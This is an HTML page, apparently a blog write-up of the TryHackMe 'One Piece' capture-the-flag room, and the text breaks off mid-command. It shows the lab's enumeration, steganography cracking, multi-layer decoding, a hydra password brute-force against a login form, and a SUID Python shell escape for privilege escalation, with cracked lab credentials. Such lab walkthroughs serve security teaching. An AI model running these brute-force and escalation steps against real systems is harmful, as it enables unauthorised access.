@@ -1,0 +1,800 @@
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>One Piece | CyFun</title><meta name=keywords content="ctf,tryhackme,penetration-testing,writeup,linux"><meta name=description content="One Piece TryHackMe writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/tryhackme/one-piece/><link crossorigin=anonymous href=/assets/css/stylesheet.8c2cb9234a4e634b8528951f7a47ea89181178c7d2c333ce2c08dfee541ed427.css integrity="sha256-jCy5I0pOY0uFKJUfekfqiRgReMfSwzPOLAjf7lQe1Cc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/tryhackme/one-piece/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="One Piece"><meta property="og:description" content="One Piece TryHackMe writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/tryhackme/one-piece/"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2021-01-01T00:00:00+00:00"><meta property="article:modified_time" content="2026-03-01T00:10:22+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/0day/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/active-directory-basics/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/advent-of-cyber/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/advent-of-cyber-2/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/adventure-time/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/agent-sudo/"><meta name=twitter:card content="summary"><meta name=twitter:title content="One Piece"><meta name=twitter:description content="One Piece TryHackMe writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"TryHackMe Writeups","item":"https://s4ch.github.io/writeups/tryhackme/"},{"@type":"ListItem","position":3,"name":"One Piece","item":"https://s4ch.github.io/writeups/tryhackme/one-piece/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"One Piece","name":"One Piece","description":"One Piece TryHackMe writeup","keywords":["ctf","tryhackme","penetration-testing","writeup","linux"],"articleBody":"A CTF room based on the wonderful manga One Piece. Can you become the Pirate King?\nOne Piece\nNetwork Enumeration FTP Enumeration Steganography Web Poking Crypthography Base32 Base64 Base85 Base91 Morse Code Binary Hex OSINT Web Enumeration Reverse Enigieering Stored Passwords \u0026 Keys Task 1 Set Sail Welcome to the One Piece room.\nYour dream is to find the One Piece and hence to become the Pirate King.\nOnce the VM is deployed, you will be able to enter a World full of Pirates.\nPlease notice that pirates do not play fair. They can create rabbit holes to trap you.\nThis room may be a bit different to what you are used to:\nRequired skills to perform the intended exploits are pretty basic. However, solving the (let’s say) “enigmas” to know what you need to do may be trickier. This room is some sort of game, some sort of puzzle.\nPlease note that if you are currently reading/watching One Piece and if you did not finish Zou arc, you will get spoiled during this room.\nDeploy the machine and hoist the sails No answer needed\nTask 2 Road Poneglyphs In order to reach Laugh Tale, the island where the One Piece is located, you must collect the 4 Road Poneglyphs.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 kali@kali:~/CTFs/tryhackme/One Piece$ sudo nmap -A -sS -sC -sV -O 10.10.93.198 [sudo] password for kali: Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-11 12:31 CEST Nmap scan report for 10.10.93.198 Host is up (0.061s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-r--r-- 1 0 0 187 Jul 26 07:27 welcome.txt | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.8.106.222 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 01:18:18:f9:b7:8a:c3:6c:7f:92:2d:93:90:55:a1:29 (RSA) | 256 cc:02:18:a9:b5:2b:49:e4:5b:77:f9:6e:c2:db:c9:0d (ECDSA) |_ 256 b8:52:72:e6:2a:d5:7e:56:3d:16:7b:bc:51:8c:7b:2a (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: New World No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=10/11%OT=21%CT=1%CU=35961%PV=Y%DS=2%DC=T%G=Y%TM=5F82DF OS:24%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=A)SE OS:Q(SP=100%GCD=1%ISR=108%TI=Z%II=I%TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6% OS:O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=68DF%W2 OS:=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNS OS:NW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y% OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR% OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40% OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G% OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 32.28 ms 10.8.0.1 2 63.04 ms 10.10.93.198 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 31.79 seconds 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 kali@kali:~/CTFs/tryhackme/One Piece$ ftp 10.10.93.198 Connected to 10.10.93.198. 220 (vsFTPd 3.0.3) Name (10.10.93.198:kali): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u003e ls -la 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 3 0 0 4096 Jul 26 07:41 . drwxr-xr-x 3 0 0 4096 Jul 26 07:41 .. drwxr-xr-x 2 0 0 4096 Jul 26 07:42 .the_whale_tree -rw-r--r-- 1 0 0 187 Jul 26 07:27 welcome.txt 226 Directory send OK. ftp\u003e get welcome.txt local: welcome.txt remote: welcome.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for welcome.txt (187 bytes). 226 Transfer complete. 187 bytes received in 0.00 secs (956.1110 kB/s) ftp\u003e cd .the_whale_tree 250 Directory successfully changed. ftp\u003e ls -la 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 0 0 4096 Jul 26 07:42 . drwxr-xr-x 3 0 0 4096 Jul 26 07:41 .. -rw-r--r-- 1 0 0 8652 Jul 26 07:42 .road_poneglyph.jpeg -rw-r--r-- 1 0 0 1147 Jul 26 07:42 .secret_room.txt 226 Directory send OK. ftp\u003e get .road_poneglyph.jpeg local: .road_poneglyph.jpeg remote: .road_poneglyph.jpeg 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for .road_poneglyph.jpeg (8652 bytes). 226 Transfer complete. 8652 bytes received in 0.00 secs (4.8309 MB/s) ftp\u003e get .secret_room.txt local: .secret_room.txt remote: .secret_room.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for .secret_room.txt (1147 bytes). 226 Transfer complete. 1147 bytes received in 0.00 secs (2.4471 MB/s) ftp\u003e exit 221 Goodbye. 1 2 3 kali@kali:~/CTFs/tryhackme/One Piece$ cat welcome.txt Welcome to Zou. It is an island located on the back of a massive, millennium-old elephant named Zunesha that roams the New World. Except this, there is not much to say about this island. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 kali@kali:~/CTFs/tryhackme/One Piece$ cat .secret_room.txt Inuarashi: You reached the center of the Whale, the majestic tree of Zou. Nekomamushi: We have hidden this place for centuries. Inuarashi: Indeed, it holds a secret. Nekomamushi: Do you see this red stele ? This is a Road Poneglyph. Luffy: A Road Poneglyph ?? Inuarashi: There are four Road Poneglyphs around the world. Each of them gives one of the key to reach Laugh Tale and to find the One Piece. Luffy: The One Piece ?? That's my dream ! I will find it and I will become the Pirate King !!! Nekomamushi: A lot have tried but only one succeeded over the centuries, Gol D Roger, the former Pirate King. Inuarashi: It is commonly known that both Emperors, Big Mom and Kaido, own a Road Poneglyph but no one knows where is the last one. Nekomamushi: The other issue is the power of Big Mom and Kaido, they are Emperor due to their strength, you won't be able to take them down easily. Luffy: I will show them, there can be only one Pirate King and it will be me !! Inuarashi: There is another issue regarding the Road Poneglyph. Nekomamushi: They are written in an ancient language and a very few people around the world can actually read them. 1 2 3 4 5 6 kali@kali:~/CTFs/tryhackme/One Piece$ steghide extract -sf .road_poneglyph.jpeg Enter passphrase: wrote extracted data to \"road_poneglyphe1.txt\". kali@kali:~/CTFs/tryhackme/One Piece$ cat road_poneglyphe1.txt FUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAXC2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBOFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LIK kali@kali:~/CTFs/tryhackme/One Piece$ view-source:http://10.10.93.198/\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead lang=\"en\"\u003e \u003ctitle\u003eNew World\u003c/title\u003e \u003clink rel=\"stylesheet\" href=\"./css/style.css\" /\u003e \u003clink rel=\"icon\" href=\"/writeups/tryhackme/one-piece/images/luffy_icon.png\" type=\"image/png\" /\u003e \u003cmeta charset=\"utf-8\" /\u003e \u003c/head\u003e \u003cbody\u003e \u003cimg src=\"/writeups/tryhackme/one-piece/images/boat.png\" alt=\"Boat\" title=\"Boat\" /\u003e \u003cp\u003e Straw Hat Luffy and his crew are sailing in the New World. \u003cbr /\u003e They have only one thing in mind, reach the One Piece and hence become the Pirate King, that is to say the freest man in the world.\u003cbr /\u003e \u003cbr /\u003e Unfortunately, your navigator Nami lost the Log Pose and as you know, it is not possible to properly steer without it.\u003cbr /\u003e You need to find the Log Pose to be able to reach the next island. \u003c/p\u003e \u003c/body\u003e \u003c/html\u003e 1 2 kali@kali:~/CTFs/tryhackme/One Piece$ echo -n 'J5VEKNCJKZEXEUSDJZEE2MC2M5KFGWJTJMYFMV2PNE2UMWLJGFBEUVKWNFGFKRJQKJLUS5SZJBBEOS2FON3U4U3TFNLVO2ZRJVJXARCUGFHEOS2YKVWUWVKON5HEOQLVKEZGI3S2GJFEOSKTPBRFAMCGKVJEIODQKJUWQ3KMIMYUCY3LNBGUWMCFO5IGYQTWKJ4VMRK2KRJEKWTMGRUVCMCKONQTGTJ5' | base32 -d | base64 -d :18!R+D#G3F`M\u00267+EV:.Eb-A%Eb-A4Eb/`pF(K05+\u003eYi51*COSF)u\u0026)Ch4`.CgggbF!,[?ATD?)F(f,-@rHL+A0\u003ePoG%De4Df^\"CBlks Nami ensures there are precisely 3472 possible places where she could have lost it.\nhttps://github.com/1FreyR/LogPose\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 kali@kali:~/CTFs/tryhackme/One Piece$ gobuster dir -u 10.10.93.198 -w LogPose.txt -x txt,php,html =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.93.198 [+] Threads: 10 [+] Wordlist: LogPose.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: txt,php,html [+] Timeout: 10s =============================================================== 2020/10/11 12:49:28 Starting gobuster =============================================================== /dr3ssr0s4.html (Status: 200) Progress: 2041 / 3472 (58.78%)^C [!] Keyboard interrupt detected, terminating. =============================================================== 2020/10/11 12:49:58 Finished =============================================================== http://10.10.93.198/dr3ssr0s4.html\nDonquixote Doflamingo\nview-source:http://10.10.93.198/css/dressrosa_style.css\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #container { height: 75vh; width: 90vw; margin: 1vh; background-image: url(\"./writeups/tryhackme/one-piece/king_kong_gun.jpg\"); background-repeat: no-repeat; background-position: center; background-size: cover; display: flex; flex-direction: row; justify-content: center; align-items: flex-start; align-content: flex-start; flex-wrap: wrap; position: relative; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 kali@kali:~/CTFs/tryhackme/One Piece$ exiftool king_kong_gun.jpg ExifTool Version Number : 12.06 File Name : king_kong_gun.jpg Directory : . File Size : 42 kB File Modification Date/Time : 2020:07:26 13:26:42+02:00 File Access Date/Time : 2020:10:11 12:57:18+02:00 File Inode Change Date/Time : 2020:10:11 12:57:03+02:00 File Permissions : rw-r--r-- File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg JFIF Version : 1.01 Resolution Unit : inches X Resolution : 72 Y Resolution : 72 Comment : Doflamingo is /ko.jpg Image Width : 736 Image Height : 414 Encoding Process : Progressive DCT, Huffman coding Bits Per Sample : 8 Color Components : 3 Y Cb Cr Sub Sampling : YCbCr4:2:0 (2 2) Image Size : 736x414 Megapixels : 0.305 1 2 3 strings ko.png Congratulations, this is the Log Pose that should lead you to the next island: /wh0l3_c4k3.php http://10.10.93.198/wh0l3_c4k3.php\n1 2 3 4 5 6 7 8 9 \u003cp\u003e You are on Whole Cake Island. This is the territory of Big Mom, one of the 4 Emperors, this is to say one of the 4 pirates the closest to the One Piece but also the strongest.\u003cbr /\u003e Big Mom chases you and want to destroy you. It is unthinkable to fight her directly.\u003cbr /\u003e You need to find a way to appease her. \u003c/p\u003e CakeForYou\nhttp://10.10.93.198/r4nd0m.html\nBuggy the Clown\nview-source:http://10.10.93.198/buggy_games/brain_teaser.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 var xDegOld = 0; var yDegOld = 0; var xDegNew = 0; var yDegNew = 0; var xCoordNew = 0; var yCoordNew = 0; var screenWidth = document.querySelector(\"body\").clientWidth; console.log(screenWidth); var screenHeight = document.querySelector(\"body\").clientHeight; console.log(screenHeight); var cube = document.getElementById(\"container__animation\"); function degDetermination() { xDegOld = xDegNew; yDegOld = yDegNew; xDegNew = -(-180 + (yCoordNew / screenHeight) * 360) / 4; yDegNew = (-180 + (xCoordNew / screenWidth) * 360) / 4; } function cubeMovement() { degDetermination(); cube.animate( [ { transform: \"rotateX(\" + xDegOld + \"deg) rotateY(\" + yDegOld + \"deg)\" }, { transform: \"rotateX(\" + xDegNew + \"deg) rotateY(\" + yDegNew + \"deg)\" }, ], { duration: 10, } ); cube.style.transform = \"rotateX(\" + xDegNew + \"deg) rotateY(\" + yDegNew + \"deg)\"; } document.getElementById(\"back\").textContent = \"Log Pose: /0n1g4sh1m4.php\"; window.addEventListener(\"mousemove\", function (e) { xCoordNew = e.clientX; yCoordNew = e.clientY; cubeMovement(); }); http://10.10.93.198/0n1g4sh1m4.php\nKaido of the Beasts\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 kali@kali:~/CTFs/tryhackme/One Piece$ stegcracker kaido.jpeg /usr/share/wordlists/rockyou.txt StegCracker 2.0.9 - (https://github.com/Paradoxis/StegCracker) Copyright (c) 2020 - Luke Paris (Paradoxis) Counting lines in wordlist.. Attacking file 'kaido.jpeg' with wordlist '/usr/share/wordlists/rockyou.txt'.. Successfully cracked file with password: imabeast Tried 106372 passwords Your file has been written to: kaido.jpeg.out imabeast kali@kali:~/CTFs/tryhackme/One Piece$ cat kaido.jpeg.out Username:K1ng_0f_th3_B3@sts kali@kali:~/CTFs/tryhackme/One Piece$ hydra -l K1ng_0f_th3_B3@sts -P /usr/share/wordlists/rockyou.txt 10.10.93.198 http-post-form \"/0n1g4sh1m4.php:user=^USER^\u0026password=^PASS^\u0026submit_creds=Login:ERROR\" -t 64 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-11 13:52:40 [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore [DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task [DATA] attacking http-post-form://10.10.93.198:80/0n1g4sh1m4.php:user=^USER^\u0026password=^PASS^\u0026submit_creds=Login:ERROR [STATUS] 10070.00 tries/min, 10070 tries in 00:01h, 14334329 to do in 23:44h, 64 active [80][http-post-form] host: 10.10.93.198 login: K1ng_0f_th3_B3@sts password: thebeast 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-11 13:54:35 1 Unfortunately, the location of this last Poneglyph is unspecified. 1 2 3 4 5 6 From_Base32('A-Z2-7=',true) From_Morse_Code('Space','Line feed') From_Binary('Space') From_Hex('Auto') From_Base58('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',true) From_Base64('A-Za-z0-9+/=',true) M0nk3y_D_7uffy:1_w1ll_b3_th3_p1r@t3_k1ng!\nhttp://10.10.93.198/unspecified\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 M0nk3y_D_7uffy@Laugh-Tale:~$ ls -la total 56 drwxr-xr-x 8 M0nk3y_D_7uffy luffy 4096 Jul 29 07:32 . drwxr-xr-x 4 root root 4096 Jul 26 07:54 .. -rw------- 1 M0nk3y_D_7uffy luffy 14 Aug 14 15:25 .bash_history -rw-r--r-- 1 M0nk3y_D_7uffy luffy 220 Jul 26 07:54 .bash_logout -rw-r--r-- 1 M0nk3y_D_7uffy luffy 3771 Jul 26 07:54 .bashrc drwx------ 11 M0nk3y_D_7uffy luffy 4096 Jul 29 07:21 .cache drwx------ 11 M0nk3y_D_7uffy luffy 4096 Jul 29 07:15 .config drwx------ 3 M0nk3y_D_7uffy luffy 4096 Jul 29 07:21 .gnupg -rw------- 1 M0nk3y_D_7uffy luffy 334 Jul 29 07:14 .ICEauthority -rw-r--r-- 1 root root 283 Jul 26 08:23 laugh_tale.txt drwx------ 3 M0nk3y_D_7uffy luffy 4096 Jul 29 07:14 .local drwx------ 5 M0nk3y_D_7uffy luffy 4096 Jul 29 07:15 .mozilla -rw-r--r-- 1 M0nk3y_D_7uffy luffy 807 Jul 26 07:54 .profile drwx------ 2 M0nk3y_D_7uffy luffy 4096 Jul 29 07:21 .ssh M0nk3y_D_7uffy@Laugh-Tale:~$ cat laugh_tale.txt Finally, we reached Laugh Tale. All is left to do is to find the One Piece. Wait, there is another boat in here. Be careful, it is the boat of Marshall D Teach, one of the 4 Emperors. He is the one that led your brother Ace to his death. You want your revenge. Let's take him down ! 1 find / -type f -perm -4000 -exec ls -l {} \\; 2\u003e /dev/null -rwsr-xr-x 1 7uffy_vs_T3@ch teach 4526456 Jul 17 08:50 /usr/bin/gomugomunooo_king_kobraaa\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 M0nk3y_D_7uffy@Laugh-Tale:~$ /usr/bin/gomugomunooo_king_kobraaa -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' $ whoami 7uffy_vs_T3@ch $ pwd /home/luffy $ cd .. $ ls -la total 16 drwxr-xr-x 4 root root 4096 Jul 26 07:54 . drwxr-xr-x 24 root root 4096 Jul 29 08:04 .. drwxr-xr-x 8 M0nk3y_D_7uffy luffy 4096 Jul 29 07:32 luffy drwxr-xr-x 7 7uffy_vs_T3@ch teach 4096 Jul 26 08:33 teach $ cd teach $ ls -la total 56 drwxr-xr-x 7 7uffy_vs_T3@ch teach 4096 Jul 26 08:33 . drwxr-xr-x 4 root root 4096 Jul 26 07:54 .. -rw------- 1 7uffy_vs_T3@ch teach 1 Aug 14 15:24 .bash_history -rw-r--r-- 1 7uffy_vs_T3@ch teach 220 Jul 26 07:09 .bash_logout -rw-r--r-- 1 7uffy_vs_T3@ch teach 3771 Jul 26 07:09 .bashrc drwx------ 11 7uffy_vs_T3@ch teach 4096 Jul 26 08:45 .cache drwx------ 11 7uffy_vs_T3@ch teach 4096 Jul 26 08:45 .config drwx------ 3 7uffy_vs_T3@ch teach 4096 Jul 26 07:16 .gnupg -rw------- 1 7uffy_vs_T3@ch teach 334 Jul 26 07:15 .ICEauthority drwx------ 3 7uffy_vs_T3@ch teach 4096 Jul 26 07:15 .local -r-------- 1 7uffy_vs_T3@ch teach 479 Jul 26 08:06 luffy_vs_teach.txt -r-------- 1 7uffy_vs_T3@ch teach 37 Jul 26 08:02 .password.txt -rw-r--r-- 1 7uffy_vs_T3@ch teach 807 Jul 26 07:09 .profile drwx------ 2 7uffy_vs_T3@ch teach 4096 Jul 26 07:16 .ssh -rw-r--r-- 1 7uffy_vs_T3@ch teach 0 Jul 26 07:16 .sudo_as_admin_successful $ cat luffy_vs_teach.txt This fight will determine who can take the One Piece and who will be the next Pirate King. These 2 monsters have a matchless will and none of them can let the other prevail. Each of them have the same dream, be the Pirate King. For one it means: Take over the World. For the other: Be the freest man in the World. Each of their hit creates an earthquake felt on the entire island. But in the end, Luffy thanks to his willpower won the fight. Now, he needs to find the One Piece. $ cat .password.txt 7uffy_vs_T3@ch:Wh0_w1ll_b3_th3_k1ng? $ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 root@Laugh-Tale:~# ls -la ls -la total 56 drwxr-xr-x 7 7uffy_vs_T3@ch teach 4096 Jul 26 08:33 . drwxr-xr-x 4 root root 4096 Jul 26 07:54 .. -rw------- 1 7uffy_vs_T3@ch teach 1 Aug 14 15:24 .bash_history -rw-r--r-- 1 7uffy_vs_T3@ch teach 220 Jul 26 07:09 .bash_logout -rw-r--r-- 1 7uffy_vs_T3@ch teach 3771 Jul 26 07:09 .bashrc drwx------ 11 7uffy_vs_T3@ch teach 4096 Jul 26 08:45 .cache drwx------ 11 7uffy_vs_T3@ch teach 4096 Jul 26 08:45 .config drwx------ 3 7uffy_vs_T3@ch teach 4096 Jul 26 07:16 .gnupg -rw------- 1 7uffy_vs_T3@ch teach 334 Jul 26 07:15 .ICEauthority drwx------ 3 7uffy_vs_T3@ch teach 4096 Jul 26 07:15 .local -r-------- 1 7uffy_vs_T3@ch teach 479 Jul 26 08:06 luffy_vs_teach.txt -r-------- 1 7uffy_vs_T3@ch teach 37 Jul 26 08:02 .password.txt -rw-r--r-- 1 7uffy_vs_T3@ch teach 807 Jul 26 07:09 .profile drwx------ 2 7uffy_vs_T3@ch teach 4096 Jul 26 07:16 .ssh -rw-r--r-- 1 7uffy_vs_T3@ch teach 0 Jul 26 07:16 .sudo_as_admin_successful root@Laugh-Tale:~# cd ~ cd ~ root@Laugh-Tale:~# pwd pwd /home/teach root@Laugh-Tale:~# cd /root cd /t bash: cd: /t: No such file or directory root@Laugh-Tale:~# grep -iRl \"One Piece\" /home /usr 2\u003e /dev/null 